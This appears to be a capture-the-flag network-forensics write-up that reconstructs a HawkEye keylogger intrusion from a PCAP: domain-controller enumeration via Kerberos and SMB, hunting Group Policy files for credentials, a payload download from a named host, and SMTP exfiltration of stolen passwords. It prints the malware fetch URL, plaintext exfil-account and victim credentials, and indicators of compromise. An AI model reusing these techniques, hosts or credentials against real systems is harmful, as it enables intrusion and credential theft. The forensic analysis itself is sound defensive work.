# HawkEye — Infostealer \& Active Directory Enumeration

**Category:** Network Forensics
**Tools:** Wireshark (Follow TCP Stream, Kerberos/SMB/SMTP analysis), CyberChef (Base64), VirusTotal
**Skills demonstrated:** multi-phase attack correlation, Active Directory / Kerberos traffic analysis, infostealer identification, SMTP exfiltration tracing, timeline reconstruction



## Scenario

A single PCAP (\~4,000 packets) from a `/24` corporate network. The task: reconstruct
the intrusion — the attacker's activity against the domain controller, the malware
involved, and what was stolen.



## Environment

* **Attacker:** 10.4.10.132
* **Domain Controller:** 10.4.10.4 (`PizzaJukebox-DC`, realm `pizzajukebox.com`), also the DNS server
* **Victim workstation:** BEIJING-5CD1-PC (user **roman.mcguire**), public IP 173.66.146.112
* 3 hosts involved; capture duration \~1h03m (2019-04-10)



## Investigation

**1. Attacker arrives already authenticated.** From the first packet, the attacker
(10.4.10.132) is performing **Kerberos** AS/TGS requests against the DC (10.4.10.4).
This means valid domain credentials were already held — **how they were obtained
predates this capture and is not determinable from the PCAP.**

**2. Domain enumeration (Kerberos + SMB).** The attacker made numerous **TGS** requests
(enumerating services) and then used **SMB2** to enumerate the DC's shares:
`IPC$`, `Shared`, and critically **`SYSVOL`** — reading Group Policy files
(`Policies\\{31B2F340-...}\\gpt.ini`). Reading SYSVOL/Group Policy is a known technique
to hunt for **credentials stored in Group Policy Preferences**, i.e. an attempt to
escalate privileges beyond the initial user.

**3. Malware delivery.** During the session, the attacker's host fetched a payload over
HTTP:

```
GET http://proforma-invoices.com/proforma/tkraw\_Protected99.exe
```

Hosted on a **LiteSpeed** web server, resolving to 217.182.138.150 (France).

* File: **tkraw\_Protected99.exe**
* MD5: `71826BA081E303866CE2A253449...`

**4. Malware identification.** The payload is **HawkEye Keylogger – Reborn v9**, a
commodity credential-stealer (identified from the exfil email subject and sample
hash).

**5. Victim fingerprinting.** HawkEye queried `bot.whatismyipaddress.com`, which
returned the victim's public IP **173.66.146.112** — the malware tags stolen data with
the victim's public-facing address/location (it appears in the exfil email subject).

**6. Credential theft + SMTP exfiltration.** HawkEye harvested browser, email, and
application credentials from roman.mcguire's machine and exfiltrated them over **SMTP**
(Exim 4.91 mail server, United States). Seven identical SMTP sessions — data is
exfiltrated **every 10 minutes**.

* SMTP auth (Base64-decoded): user `sales.del@macwinlogistics.in`, password `Sales@23`
* From/To: `sales.del@macwinlogistics.in`
* Subject: `HawkEye Keylogger - Reborn v9 - Passwords Logs - roman.mcguire \\ BEIJING-5CD1-PC - 173.66.146.112`

Stolen credentials included (plaintext in the mail body):

* AOL: `roman.mcguire914@aol.com` / `P@ssw0rd$`
* **Bank of America:** `roman.mcguire` / `P@ssw0rd$`
* Outlook/POP3: `roman.mcguire@pizzajukebox.com` / `P@ssw0rd$`



## Attack Chain

```
\[Initial domain access obtained BEFORE capture — not determinable from PCAP]
  → attacker (10.4.10.132) authenticates via Kerberos to DC (10.4.10.4)
  → TGS enumeration + SMB share enumeration (IPC$, Shared, SYSVOL)
      → reads Group Policy files hunting for stored credentials (priv-esc attempt)
  → downloads HawkEye (tkraw\_Protected99.exe) from proforma-invoices.com (LiteSpeed)
  → HawkEye fingerprints victim public IP (173.66.146.112)
  → steals browser / email / domain credentials from roman.mcguire
  → exfiltrates via SMTP every 10 minutes (Exim 4.91), 7 sessions
```



## Indicators of Compromise

|Type|Value|
|-|-|
|Attacker IP|10.4.10.132|
|Domain controller|10.4.10.4 (PizzaJukebox-DC, pizzajukebox.com)|
|Victim|BEIJING-5CD1-PC / roman.mcguire / 173.66.146.112|
|Malware|HawkEye Keylogger Reborn v9 — tkraw\_Protected99.exe|
|Malware MD5|71826BA081E303866CE2A253449...|
|Payload host|proforma-invoices.com (217.182.138.150, France, LiteSpeed)|
|Exfil method|SMTP (Exim 4.91), every 10 minutes|
|Exfil account|sales.del@macwinlogistics.in (pass: Sales@23)|
|IP-check|bot.whatismyipaddress.com|



## Summary

A PCAP capturing two interleaved attack activities by an already-authenticated domain
attacker: Kerberos/SMB enumeration of the domain controller (including SYSVOL/Group
Policy, hunting for stored credentials to escalate), and deployment of the **HawkEye
Reborn v9** infostealer, which harvested a user's banking/email/domain credentials and
exfiltrated them over SMTP every 10 minutes.

